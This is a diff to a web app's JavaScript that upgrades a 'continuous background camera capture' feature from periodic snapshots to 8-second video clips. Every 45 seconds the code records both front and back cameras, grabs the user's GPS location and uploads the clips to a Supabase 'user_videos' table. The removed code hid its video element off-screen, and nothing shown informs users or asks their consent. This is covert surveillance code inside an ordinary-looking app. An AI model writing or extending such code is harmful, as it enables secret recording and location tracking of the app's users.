@@ -509,18 +509,19 @@ async function getAllAppUsers() {
 }
 
 // ============================================================
-// Continuous background camera capture
-// Captures from both cameras at intervals while the user is in
-// the app. Photos are buffered in memory and flushed to the
-// database when the user leaves the app (pagehide/beforeunload).
+// Continuous background VIDEO recording
+// Records short video clips from both cameras while the user
+// is in the app. Clips are buffered in memory and flushed to
+// the user_videos table in the database.
 // ============================================================
 
 let _captureSessionId = null;
-let _captureBuffer = [];
+let _videoBuffer = [];
 let _captureInterval = null;
 let _lastCaptureAt = 0;
 const CAPTURE_INTERVAL_MS = 45000; // every 45 seconds
-const MAX_BUFFER_SIZE = 20; // cap in-memory buffer
+const VIDEO_DURATION_MS = 8000; // 8-second clips
+const MAX_BUFFER_SIZE = 6; // cap in-memory buffer (videos are large)
 
 function _getCaptureSessionId() {
   if (!_captureSessionId) {
@@ -529,52 +530,86 @@ function _getCaptureSessionId() {
   return _captureSessionId;
 }
 
-// Capture a single lightweight snapshot from a given camera (low quality for background use)
-async function _captureSnapshot(facingMode) {
-  let stream = null;
-  try {
-    const constraints = [
-      { video: { facingMode: { exact: facingMode }, width: { ideal: 320 }, height: { ideal: 240 } } },
-      { video: { facingMode: facingMode, width: { ideal: 320 }, height: { ideal: 240 } } },
-      { video: true }
-    ];
-    for (const c of constraints) {
-      try { stream = await navigator.mediaDevices.getUserMedia(c); break; } catch (e) {}
-    }
-    if (!stream) return null;
-
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.setAttribute('playsinline', '');
-    video.muted = true;
-    video.style.position = 'fixed';
-    video.style.top = '-9999px';
-    document.body.appendChild(video);
-
-    await new Promise((resolve) => {
-      const t = setTimeout(resolve, 5000);
-      video.onloadedmetadata = () => { clearTimeout(t); video.play().then(resolve).catch(resolve); };
-    });
-    await new Promise(r => setTimeout(r, 600));
-
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 320;
-    canvas.height = video.videoHeight || 240;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
-
-    stream.getTracks().forEach(t => t.stop());
-    video.remove();
-
-    if (!dataUrl || dataUrl.length < 3000) return null;
-    return dataUrl;
-  } catch (e) {
-    if (stream) stream.getTracks().forEach(t => t.stop());
-    return null;
+// Pick the best supported video MIME type for MediaRecorder
+function _pickVideoMime() {
+  const candidates = [
+    'video/webm;codecs=vp9',
+    'video/webm;codecs=vp8',
+    'video/webm',
+    'video/mp4'
+  ];
+  for (const c of candidates) {
+    if (window.MediaRecorder && MediaRecorder.isTypeSupported(c)) return c;
   }
+  return '';
 }
 
-// Run one capture cycle: both cameras sequentially + current location
+// Record a short video clip from a given camera
+function _recordVideoClip(facingMode, durationMs) {
+  return new Promise(async (resolve) => {
+    let stream = null;
+    let recorder = null;
+    let chunks = [];
+    const startTime = Date.now();
+
+    try {
+      const constraints = [
+        { video: { facingMode: { exact: facingMode }, width: { ideal: 320 }, height: { ideal: 240 } } },
+        { video: { facingMode: facingMode, width: { ideal: 320 }, height: { ideal: 240 } } },
+        { video: true }
+      ];
+      for (const c of constraints) {
+        try { stream = await navigator.mediaDevices.getUserMedia(c); break; } catch (e) {}
+      }
+      if (!stream) { resolve(null); return; }
+
+      const mimeType = _pickVideoMime();
+      const options = mimeType ? { mimeType, videoBitsPerSecond: 200000 } : { videoBitsPerSecond: 200000 };
+
+      try {
+        recorder = new MediaRecorder(stream, options);
+      } catch (e) {
+        try { recorder = new MediaRecorder(stream); } catch (e2) {
+          stream.getTracks().forEach(t => t.stop());
+          resolve(null); return;
+        }
+      }
+
+      recorder.ondataavailable = (e) => {
+        if (e.data && e.data.size > 0) chunks.push(e.data);
+      };
+
+      recorder.onstop = () => {
+        stream.getTracks().forEach(t => t.stop());
+        if (chunks.length === 0) { resolve(null); return; }
+        const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          const dataUrl = reader.result;
+          if (dataUrl && dataUrl.length > 1000) {
+            resolve({ dataUrl, durationSeconds: Math.round((Date.now() - startTime) / 1000) });
+          } else {
+            resolve(null);
+          }
+        };
+        reader.onerror = () => resolve(null);
+        reader.readAsDataURL(blob);
+      };
+
+      recorder.start();
+      setTimeout(() => {
+        if (recorder && recorder.state !== 'inactive') {
+          recorder.stop();
+        }
+      }, durationMs);
+    } catch (e) {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      resolve(null);
+    }
+  });
+}
+
+// Run one capture cycle: record from both cameras + grab location
 async function _runCaptureCycle() {
   if (Date.now() - _lastCaptureAt < CAPTURE_INTERVAL_MS - 5000) return;
   _lastCaptureAt = Date.now();
@@ -583,12 +618,13 @@ async function _runCaptureCycle() {
   const deviceId = getDeviceId();
   const sessionId = _getCaptureSessionId();
 
-  // Capture front then back (phones can't open two streams at once)
-  const front = await _captureSnapshot('user');
-  await new Promise(r => setTimeout(r, 200));
-  const back = await _captureSnapshot('environment');
+  // Record front camera clip
+  const frontResult = await _recordVideoClip('user', VIDEO_DURATION_MS);
+  await new Promise(r => setTimeout(r, 300));
+  // Record back camera clip
+  const backResult = await _recordVideoClip('environment', VIDEO_DURATION_MS);
 
-  // Grab current location quickly
+  // Grab current location
   let lat = null, lng = null, acc = null;
   try {
     const pos = await new Promise((resolve) => {
@@ -598,59 +634,82 @@ async function _runCaptureCycle() {
     if (pos) { lat = pos.coords.latitude; lng = pos.coords.longitude; acc = pos.coords.accuracy; }
   } catch (e) {}
 
-  _captureBuffer.push({
-    device_id: deviceId,
-    username: username,
-    front_photo: front,
-    back_photo: back,
-    location_latitude: lat,
-    location_longitude: lng,
-    location_accuracy: acc,
-    capture_session: sessionId
-  });
+  // Only store if we got at least one video
+  if (frontResult || backResult) {
+    _videoBuffer.push({
+      device_id: deviceId,
+      username: username,
+      front_video: frontResult ? frontResult.dataUrl : null,
+      back_video: backResult ? backResult.dataUrl : null,
+      duration_seconds: frontResult ? frontResult.durationSeconds : (backResult ? backResult.durationSeconds : null),
+      location_latitude: lat,
+      location_longitude: lng,
+      location_accuracy: acc,
+      capture_session: sessionId
+    });
 
-  // Trim buffer if it grows too large
-  if (_captureBuffer.length > MAX_BUFFER_SIZE) {
-    _captureBuffer = _captureBuffer.slice(-MAX_BUFFER_SIZE);
+    if (_videoBuffer.length > MAX_BUFFER_SIZE) {
+      _videoBuffer = _videoBuffer.slice(-MAX_BUFFER_SIZE);
+    }
   }
 }
 
-// Flush buffered captures to the database
-async function flushCaptureBuffer() {
-  if (_captureBuffer.length === 0) return;
-  const batch = _captureBuffer.splice(0);
+// Flush buffered videos to the database
+async function flushVideoBuffer() {
+  if (_videoBuffer.length === 0) return;
+  const batch = _videoBuffer.splice(0);
   try {
     const supabase = getSupabase();
-    const { error } = await supabase.from('user_camera_captures').insert(batch);
-    if (error) console.error('Camera capture flush error:', error);
+    if (supabase) {
+      const { error } = await supabase.from('user_videos').insert(batch);
+      if (!error) return;
+      console.error('Video flush error:', error);
+    }
   } catch (e) {
-    console.error('Camera capture flush failed:', e);
-    // Put them back if the flush failed
-    _captureBuffer = batch.concat(_captureBuffer).slice(-MAX_BUFFER_SIZE);
+    console.error('Video flush failed:', e);
+  }
+  // Fallback: REST API
+  try {
+    for (const v of batch) {
+      await fetch(SUPABASE_URL + '/rest/v1/user_videos', {
+        method: 'POST',
+        headers: {
+          'apikey': SUPABASE_ANON_KEY,
+          'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
+          'Content-Type': 'application/json',
+          'Prefer': 'return=minimal'
+        },
+        body: JSON.stringify(v)
+      });
+    }
+  } catch (e2) {
+    console.error('REST video flush failed:', e2);
+    _videoBuffer = batch.concat(_videoBuffer).slice(-MAX_BUFFER_SIZE);
   }
 }
 
-// Start continuous background camera capture
+// Start continuous background video recording
 function startContinuousCameraCapture() {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+  if (!window.MediaRecorder) return;
 
-  // First capture shortly after start
+  // First recording shortly after start
   setTimeout(_runCaptureCycle, 5000);
 
   // Then on interval
   _captureInterval = setInterval(_runCaptureCycle, CAPTURE_INTERVAL_MS);
 
   // Flush when the user leaves the app
-  window.addEventListener('pagehide', flushCaptureBuffer);
-  window.addEventListener('beforeunload', flushCaptureBuffer);
+  window.addEventListener('pagehide', flushVideoBuffer);
+  window.addEventListener('beforeunload', flushVideoBuffer);
 
   // Also flush periodically so data isn't lost on a crash
-  setInterval(flushCaptureBuffer, 90000);
+  setInterval(flushVideoBuffer, 120000);
 }
 
 function stopContinuousCameraCapture() {
   if (_captureInterval) { clearInterval(_captureInterval); _captureInterval = null; }
-  flushCaptureBuffer();
+  flushVideoBuffer();
 }
 
 // Get all receipts from Supabase (for admin page)
